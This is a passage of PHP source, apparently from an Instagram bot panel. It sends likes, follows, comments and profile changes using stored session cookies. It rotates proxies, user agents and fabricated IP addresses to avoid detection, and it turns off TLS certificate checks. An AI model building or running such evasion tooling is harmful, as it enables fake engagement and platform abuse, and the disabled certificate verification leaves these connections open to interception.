		return $this->loginRequest($username . '/?__a=1', $headers, NULL);
	}

	public function getMediaData($permalink)
	{
		$linksplit = explode("/", $permalink);

		$handle = curl_init();
		curl_setopt($handle, CURLOPT_URL, 'https://i.instagram.com/publicapi/oembed/?url=' . $permalink);
		curl_setopt($handle, CURLOPT_POST, false);
		curl_setopt($handle, CURLOPT_BINARYTRANSFER, false);
		curl_setopt($handle, CURLOPT_HEADER, true);
		curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($handle, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($handle, CURLOPT_FOLLOWLOCATION, true);
		$response = curl_exec($handle);
		$hlength = curl_getinfo($handle, CURLINFO_HEADER_SIZE);
		$httpCode = curl_getinfo($handle, CURLINFO_HTTP_CODE);
		$body = substr($response, $hlength);

		if ($httpCode != 200) {
			return false;
		}

		return json_decode($body, true);
	}

	public function getUserData()
	{
		$headers = [];
		$headers[] = 'cookie: sessionid=' . $this->settings->get('sessionID');
		return $this->loginRequest('accounts/edit/?__a=1', $headers, NULL);
	}

	public function getUserInfo($username)
	{
		$headers = [];
		$headers[] = 'cookie: sessionid=' . $this->settings->get('sessionID');
		return $this->loginRequest($username . '/?__a=1', $headers, NULL);
	}

	public function getMediaInfo($id, $shortcode)
	{
		$headers = [];
		$headers[] = 'cookie: sessionid=' . $this->settings->get('sessionID');
		return $this->loginRequest('/p/' . $shortcode . '/?__a=1', $headers, NULL);
	}

	protected function checkSettings($forceUserIP = false)
	{
		$settingsCompare = $this->settings->get('sets');
		if (($this->settings->get('ip') == NULL) || $forceUserIP) {
			$ipAdress = '78.' . rand(160, 191) . '.' . rand(1, 255) . '.' . rand(1, 255);
			if ($forceUserIP && !empty($_SERVER['REMOTE_ADDR'])) {
				$ipAdress = $_SERVER['REMOTE_ADDR'];
			}

			$this->settings->set('ip', $ipAdress);
		}

		if ($this->settings->get('ds_user_id') == NULL) {
			$this->settings->set('ds_user_id', $this->username_id);
		}

		if ($this->settings->get('web_user_agent') == NULL) {
			$userAgents = explode(PHP_EOL, file_get_contents(Wow::get('project/cookiePath') . 'device/browsers.csv'));
			$agentIndex = rand(0, count($userAgents) - 1);
			$userAgent = $userAgents[$agentIndex];
			$this->settings->set('web_user_agent', $userAgent);
		}

		if (0 < INSTAWEB_MAX_ASNS) {
			if (($this->settings->get(INSTAWEB_ASNS_KEY) == NULL) || (INSTAWEB_MAX_ASNS < intval($this->settings->get(INSTAWEB_ASNS_KEY)))) {
				$this->settings->set(INSTAWEB_ASNS_KEY, rand(1, INSTAWEB_MAX_ASNS));
			}
// 			$this->settings->set(INSTAWEB_ASNS_KEY, rand(1, INSTAWEB_MAX_ASNS));
		}

		if ($settingsCompare !== $this->settings->get('sets')) {
			$this->settings->save();
		}
	}

	public function getData()
	{
		if ($this->settings->get('web_user_agent') == NULL) {
			$userAgents = explode(PHP_EOL, file_get_contents(Wow::get('project/cookiePath') . 'device/browsers.csv'));
			$agentIndex = rand(0, count($userAgents) - 1);
			$userAgent = $userAgents[$agentIndex];
			$this->settings->set('web_user_agent', $userAgent);
		}

		return ['username' => $this->username, 'username_id' => $this->username_id, 'token' => $this->token, 'web_user_agent' => $this->settings->get('web_user_agent') ? $this->settings->get('web_user_agent') : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14', 'ip' => $this->settings->get('ip'), 'web_cookie' => $this->settings->get('web_cookie'), INSTAWEB_ASNS_KEY => $this->settings->get(INSTAWEB_ASNS_KEY)];
	}

	public function comment($mediaId, $commentText)
	{
		$arrMediaID = explode('_', $mediaId);
		$mediaId = $arrMediaID[0];
		$postData = 'comment_text=' . $commentText;
		$headers = [];
		$headers[] = 'Referer: https://www.instagram.com/';
		$headers[] = 'DNT: 1';
		$headers[] = 'Origin: https://www.instagram.com/';
		$headers[] = 'X-CSRFToken: ' . trim($this->token);
		$headers[] = 'X-Requested-With: XMLHttpRequest';
		$headers[] = 'X-Instagram-AJAX: 1';
		$headers[] = 'Connection: close';
		$headers[] = 'Cache-Control: max-age=0';
		return $this->request('web/comments/' . $mediaId . '/add/', $headers, $postData)[1];
	}

	public function mediaInfo($mediaCode)
	{
		$headers = [];
		$headers[] = 'Referer: https://www.instagram.com/';
		$headers[] = 'DNT: 1';
		$headers[] = 'Origin: https://www.instagram.com/';
		$headers[] = 'X-CSRFToken: ' . trim($this->token);
		$headers[] = 'X-Requested-With: XMLHttpRequest';
		$headers[] = 'X-Instagram-AJAX: 1';
		$headers[] = 'Connection: close';
		$headers[] = 'Cache-Control: max-age=0';
		return $this->request('p/' . $mediaCode . '/?__a=1', $headers)[1];
	}

	public function like($mediaId)
	{
		$arrMediaID = explode('_', $mediaId);
		$mediaId = $arrMediaID[0];
		$headers = [];
		$headers[] = 'Referer: https://www.instagram.com/instagram/';
		$headers[] = 'DNT: 1';
		$headers[] = 'Origin: https://www.instagram.com/';
		$headers[] = 'X-CSRFToken: ' . trim($this->token);
		$headers[] = 'X-Requested-With: XMLHttpRequest';
		$headers[] = 'X-Instagram-AJAX: 1';
		$headers[] = 'Connection: close';
		$headers[] = 'Cache-Control: max-age=0';
		return $this->request('web/likes/' . $mediaId . '/like/', $headers, true)[1];
	}

	public function unlike($mediaId)
	{
		$arrMediaID = explode('_', $mediaId);
		$mediaId = $arrMediaID[0];
		$headers = [];
		$headers[] = 'Referer: https://www.instagram.com/';
		$headers[] = 'DNT: 1';
		$headers[] = 'Origin: https://www.instagram.com/';
		$headers[] = 'X-CSRFToken: ' . trim($this->token);
		$headers[] = 'X-Requested-With: XMLHttpRequest';
		$headers[] = 'X-Instagram-AJAX: 1';
		$headers[] = 'Connection: close';
		$headers[] = 'Cache-Control: max-age=0';
		return $this->request('web/likes/' . $mediaId . '/unlike/', $headers, true)[1];
	}

	public function follow($userId)
	{
		$headers = [];
		$headers[] = 'x-csrftoken: 1';
		$headers[] = 'x-requested-with: XMLHttpRequest';
		$headers[] = 'x-instagram-ajax: 1';
		$headers[] = 'Content-Type: application/x-www-form-urlencoded';
		$headers[] = 'cookie: sessionid=' . $this->settings->get('sessionID');
		return $this->loginRequest('web/friendships/' . $userId . '/follow/', $headers, true);
	}

	public function unfollow($userId)
	{
		$headers = [];
		$headers[] = 'Referer: https://www.instagram.com/instagram/';
		$headers[] = 'DNT: 1';
		$headers[] = 'Origin: https://www.instagram.com/';
		$headers[] = 'X-CSRFToken: ' . trim($this->token);
		$headers[] = 'X-Requested-With: XMLHttpRequest';
		$headers[] = 'X-Instagram-AJAX: 1';
		$headers[] = 'Connection: close';
		$headers[] = 'Cache-Control: max-age=0';
		return $this->request('web/friendships/' . $userId . '/unfollow/', $headers, true)[1];
	}

	public function changeProfilePicture($photo)
	{
		$bodies = [
			[
				'type'     => 'form-data',
				'name'     => 'profile_pic',
				'data'     => file_get_contents($photo),
				'filename' => 'profile_pic',
				'headers'  => ['Content-type: application/octet-stream', 'Content-Transfer-Encoding: binary']
			]
		];
		$seed = str_split('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
		shuffle($seed);
		$rand = '';

		foreach (array_rand($seed, 16) as $k) {
			$rand .= $seed[$k];
		}

		$boundary = 'WebKitFormBoundary' . $rand;
		$data = $this->buildBody($bodies, $boundary);
		$headers = ['Connection: close', 'Accept: */*', 'Content-Type: multipart/form-data; boundary=' . $boundary, 'Content-Length: ' . strlen($data), 'Accept-Language: fr-FR'];
		$headers[] = 'Referer: https://www.instagram.com/accounts/edit/';
		$headers[] = 'Origin: https://www.instagram.com/';
		$headers[] = 'X-CSRFToken: ' . trim($this->token);
		$headers[] = 'X-Requested-With: XMLHttpRequest';
		$headers[] = 'X-Instagram-AJAX: 1';
		$endpoint = 'accounts/web_change_profile_picture/';
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/' . $endpoint);
		curl_setopt($ch, CURLOPT_USERAGENT, $this->settings->get('web_user_agent') ? $this->settings->get('web_user_agent') : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');
		curl_setopt($ch, CURLOPT_COOKIE, $this->settings->get('web_cookie'));

		if (2 <= Wow::get('ayar/proxyStatus')) {
			$userAsns = Utils::generateAsns($this->settings->get(INSTAWEB_ASNS_KEY));

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		curl_setopt($ch, CURLOPT_POST, true);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		$resp = curl_exec($ch);
		$header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($resp, 0, $header_len);
		$upload = json_decode(substr($resp, $header_len), true, 512, JSON_BIGINT_AS_STRING);
		$this->organizeCookies($header);
		curl_close($ch);
		return $upload;
	}

	protected function buildBody($bodies, $boundary)
	{
		$body = '';

		foreach ($bodies as $b) {
			$body .= '--' . $boundary . "\r\n";
			$body .= 'Content-Disposition: ' . $b['type'] . '; name="' . $b['name'] . '"';

			if (isset($b['filename'])) {
				$ext = pathinfo($b['filename'], PATHINFO_EXTENSION);
				$body .= '; filename="pending_media_' . number_format(round(microtime(true) * 1000), 0, '', '') . '.' . $ext . '"';
			}
			if (isset($b['headers']) && is_array($b['headers'])) {
				foreach ($b['headers'] as $header) {
					$body .= "\r\n" . $header;
				}
			}

			$body .= "\r\n\r\n" . $b['data'] . "\r\n";
		}

		$body .= '--' . $boundary . '--';
		return $body;
	}

	public function mailApprove($mailCode)
	{
		return $this->request('accounts/confirm_email/' . $mailCode . '/?app_redirect=False', []);
	}

	protected function loginRequest($endpoint, array $optionalheaders, $post = NULL)
	{
		$headers = ['Connection: close', 'Accept: */*', 'Accept-Language: fr-FR'];
		$headers = array_merge($headers, $optionalheaders);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/' . $endpoint);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');

		if (2 <= Wow::get('ayar/proxyStatus')) {
			$userAsns = Utils::generateAsns($this->settings->get(INSTAWEB_ASNS_KEY));

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		if ($post) {
			curl_setopt($ch, CURLOPT_POST, true);

			if (is_string($post)) {
				curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
			}
		}

		$resp = curl_exec($ch);
		$header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($resp, 0, $header_len);
		$body = substr($resp, $header_len);
		$sessionID = $this->loginorganizeCookies($header);
		curl_close($ch);
		return ['sessionID' => $sessionID, 'response' => strip_tags($body)];
	}

	protected function request($endpoint, array $optionalheaders, $post = NULL)
	{
		if (!$this->isLoggedIn) {
			throw new Exception('Not logged in' . "\n");
		}

		$headers = ['Connection: close', 'Accept: */*', 'Accept-Language: fr-FR'];
		$headers = array_merge($headers, $optionalheaders);
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/' . $endpoint);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_VERBOSE, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		curl_setopt($ch, CURLOPT_ENCODING, '');
		curl_setopt($ch, CURLOPT_COOKIE, $this->settings->get('web_cookie'));

		if (2 <= Wow::get('ayar/proxyStatus')) {
			$userAsns = Utils::generateAsns($this->settings->get(INSTAWEB_ASNS_KEY));

			if ($userAsns[0]) {
				$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_INTERFACE : CURLOPT_PROXY);
				curl_setopt($ch, $optionKey, $userAsns[0]);

				if ($userAsns[1]) {
					$optionKey = (Wow::get('ayar/proxyStatus') == 4 ? CURLOPT_IPRESOLVE : CURLOPT_PROXYUSERPWD);
					curl_setopt($ch, $optionKey, $userAsns[1]);
				}
			}
		}

		if ($post) {
			curl_setopt($ch, CURLOPT_POST, true);

			if (is_string($post)) {
				curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
			}
		}

		$resp = curl_exec($ch);
		$header_len = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
		$header = substr($resp, 0, $header_len);
		$body = substr($resp, $header_len);
		$this->organizeCookies($header);
		curl_close($ch);
		return [$header, json_decode($body, true, 512, JSON_BIGINT_AS_STRING)];
	}

	public function isLoggedIn()
	{
		return $this->isLoggedIn;
	}

	public function isValid()
	{
		$headers = [];
		$headers[] = 'Referer: https://www.instagram.com/';
		$headers[] = 'DNT: 1';
		$headers[] = 'Origin: https://www.instagram.com/';
		$headers[] = 'X-CSRFToken: ' . trim($this->token);
		$headers[] = 'X-Requested-With: XMLHttpRequest';
		$headers[] = 'X-Instagram-AJAX: 1';
		$headers[] = 'Connection: close';
		$headers[] = 'Cache-Control: max-age=0';
		$header = $this->request('accounts/activity/?__a=1', $headers)[0];
		return strpos($header, 'HTTP/1.1 200 OK') === false ? false : true;
	}

	public function loginorganizeCookies($headers)
	{
		preg_match_all('/^Set-Cookie:\\s*([^;]*)/mi', $headers, $matches);
		$cookie_all = [];
		$sessionID = NULL;
		$userID = NULL;

		if (!empty($matches[1])) {
			foreach ($matches[1] as $data) {
				$d = explode('=', $data);

				if (!empty($d[1])) {
					if (2 < strlen($d[1])) {
						$cookie_all[] = $d[0] . '=' . urlencode($d[1]);
					}
					if (($d[0] == 'sessionid') && (5 < strlen($d[1]))) {
						$sessionID = $d[1];
					}
					if (($d[0] == 'ds_user_id') && (5 < strlen($d[1]))) {
						$userID = $d[1];
					}
				}
			}
		}

		if (!empty($userID)) {
			$this->IGDataPath = Wow::get('project/cookiePath') . 'instagramv3/' . substr($_SESSION["accountId"], -1) . '/';
			$this->settings = new Settings($this->IGDataPath . $_SESSION["accountId"] . '.iwb');
			$this->settings->set('sessionID', $sessionID);
			$this->settings->set('web_cookie', implode(';', $cookie_all));
			$this->settings->save();
		}

		return $sessionID;
	}

	public function organizeCookies($headers)
	{
		preg_match_all('/^Set-Cookie:\\s*([^;]*)/mi', $headers, $matches);
		$cookies = [];

		foreach ($matches[1] as $item) {
			parse_str($item, $cookie);
			$cookies = array_merge($cookies, $cookie);
		}

		if (!empty($cookies)) {
			$oldCookies = ($this->settings->get('web_cookie') === NULL ? NULL : $this->settings->get('web_cookie'));
			$arrOldCookies = [];

			if (!empty($oldCookies)) {
				$parseCookies = explode(';', $oldCookies);

				foreach ($parseCookies as $c) {
					parse_str($c, $ck);
					$arrOldCookies = array_merge($arrOldCookies, $ck);
				}
			}

			$newCookies = array_merge($arrOldCookies, $cookies);
			$cookie_all = [];

			foreach ($newCookies as $k => $v) {
				$cookie_all[] = $k . '=' . urlencode($v);

				if ($k == 'csrftoken') {
					$this->token = $v;
					$this->settings->set('token', $v);
				}
			}

			$this->settings->set('web_cookie', implode(';', $cookie_all));
			$this->settings->save();
		}
	}
}

$uri = str_replace('@', '%40', isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/');
if ((!isset($_SERVER['HTTP_USER_AGENT']) || empty($_SERVER['HTTP_USER_AGENT'])) && ($uri != '/cron-job') && !isset($_SERVER['HTTP_CRONJOBTOKEN'])) {
	header('HTTP/1.1 403 Forbidden');
	echo 'Server Error!';
	exit();
}

define('INSTABOM_VERSION', '4.1');
define('INSTAWEB_LICENSE_SESSION_HASH', 'aDSJKLjkdfhsdf');
define('INSTAWEB_LICENSE_KEY_PREVIOUS_HASH', '89237h8932d');
define('INSTAWEB_LICENSE_KEY_HASH', 'mtuTjsrR');

require_once 'src/autoload.php';
require __DIR__ . '/vendor/autoload.php';
require 'src/Wow/Wow.php';
$self = Wow::app();
if ((substr(strtolower($uri), 0, 9) == '/cron-job') && (!isset($_SERVER['HTTP_CRONJOBTOKEN']) || ($_SERVER['HTTP_CRONJOBTOKEN'] != Wow::get('project/cronJobToken')))) {
	header('HTTP/1.1 403 Forbidden');
	echo 'Server Error!';
	exit();
}

$secure = (isset($_SERVER['HTTPS']) ? $_SERVER['HTTPS'] : 'off');
if (($secure == 'off') && (Wow::get('project/onlyHttps') === true)) {
	header('HTTP/1.1 301 Moved Permanently');
	header('Location: https://' . $_SERVER['HTTP_HOST'] . $uri);
	exit();
}

$systemSettings = json_decode(file_get_contents('./app/Config/system-settings.php'), true);

foreach ($systemSettings as $k => $v) {
	$v2 = (filter_var($v, FILTER_VALIDATE_INT) !== false ? intval($v) : $v);
	Wow::set('ayar/' . $k, $v2);
}
if (Wow::has('ayar/antiFloodEnabled') && (Wow::get('ayar/antiFloodEnabled') == 1) && !(isset($_GET['scKey']) && (Wow::get('ayar/securityKey') == $_GET['scKey']))) {
	$antiFloodOptions = [AntiFlood::OPTION_COUNTER_RESET_SECONDS => Wow::has('ayar/antiFloodResetSec') ? Wow::get('ayar/antiFloodResetSec') : 2, AntiFlood::OPTION_MAX_REQUESTS => Wow::has('ayar/antiFloodMaxReq') ? Wow::get('ayar/antiFloodMaxReq') : 5, AntiFlood::OPTION_BAN_REMOVE_SECONDS => Wow::has('ayar/antiFloodBanRemoveSec') ? Wow::get('ayar/antiFloodBanRemoveSec') : 60, AntiFlood::OPTION_DATA_PATH => './app/Cookies/anti-flood'];
	$objAntiFlood = new AntiFlood($antiFloodOptions);

	if ($objAntiFlood->isBanned()) {
		header('HTTP/1.1 429 Too Many Requests');
		echo file_get_contents("app/Views/ncse-v2/error/tmr-handle.html");
		exit();
	}
}
$self->startSession(false);
$site = trim(str_replace('www.', '', $_SERVER['HTTP_HOST']));


if (intval(Wow::get('ayar/proxyStatus')) == 0) {
	$maxAsns = 0;
} else if (intval(Wow::get('ayar/proxyStatus')) == 4) {
	$maxAsns = (trim(Wow::get('ayar/proxyList')) == '' ? 0 : count(explode("\r\n", Wow::get('ayar/proxyList'))));
} else if (Wow::get('ayar/proxyStatus') == 3) {
	$byPassServerCode = trim(Wow::get('ayar/proxyList'));
	$byPassServerRange = (strpos($byPassServerCode, '@') !== false ? explode(':', explode('@', $byPassServerCode)[1]) : explode(':', $byPassServerCode));
	$maxAsns = intval($byPassServerRange[2]) - intval($byPassServerRange[1]);
} else {
	$maxAsns = (trim(Wow::get('ayar/proxyList')) == '' ? 0 : count(explode("\r\n", Wow::get('ayar/proxyList'))));
}


if (intval(Wow::get('ayar/proxyStatusLogin')) == 0) {
	$maxAsnsLogin = 0;
} else if (intval(Wow::get('ayar/proxyStatusLogin')) == 4) {
	$maxAsnsLogin = (trim(Wow::get('ayar/proxyListLogin')) == '' ? 0 : count(explode("\r\n", Wow::get('ayar/proxyListLogin'))));
} else if (Wow::get('ayar/proxyStatusLogin') == 3) {
	$byPassServerCodeLogin = trim(Wow::get('ayar/proxyListLogin'));
	$byPassServerRangeLogin = (strpos($byPassServerCodeLogin, '@') !== false ? explode(':', explode('@', $byPassServerCodeLogin)[1]) : explode(':', $byPassServerCodeLogin));
	$maxAsnsLogin = intval($byPassServerRangeLogin[2]) - intval($byPassServerRangeLogin[1]);
} else {
	$maxAsnsLogin = (trim(Wow::get('ayar/proxyListLogin')) == '' ? 0 : count(explode("\r\n", Wow::get('ayar/proxyListLogin'))));
}


if (intval(Wow::get('ayar/proxyStatusFollow')) == 0) {
	$maxAsnsFollow = 0;
} else if (intval(Wow::get('ayar/proxyStatusFollow')) == 4) {
	$maxAsnsFollow = (trim(Wow::get('ayar/proxyListFollow')) == '' ? 0 : count(explode("\r\n", Wow::get('ayar/proxyListFollow'))));
} else if (Wow::get('ayar/proxyStatusFollow') == 3) {
	$byPassServerCodeFollow = trim(Wow::get('ayar/proxyListFollow'));
	$byPassServerRangeFollow = (strpos($byPassServerCodeFollow, '@') !== false ? explode(':', explode('@', $byPassServerCodeFollow)[1]) : explode(':', $byPassServerCodeFollow));
	$maxAsnsFollow = intval($byPassServerRangeFollow[2]) - intval($byPassServerRangeFollow[1]);
} else {
	$maxAsnsFollow = (trim(Wow::get('ayar/proxyListFollow')) == '' ? 0 : count(explode("\r\n", Wow::get('ayar/proxyListFollow'))));
}

define('INSTAWEB_MAX_ASNS', $maxAsns);
define('INSTAWEB_ASNS_KEY', 'asns' . md5(str_replace('www.', '', $_SERVER['HTTP_HOST'])));

define('INSTAWEB_MAX_ASNS_LOGIN', $maxAsnsLogin);
define('INSTAWEB_ASNS_KEY_LOGIN', 'asnsLogin' . md5(str_replace('www.', '', $_SERVER['HTTP_HOST'])));

define('INSTAWEB_MAX_ASNS_FOLLOW', $maxAsnsFollow);
define('INSTAWEB_ASNS_KEY_FOLLOW', 'asnsFollow' . md5(str_replace('www.', '', $_SERVER['HTTP_HOST'])));
Wow::start();
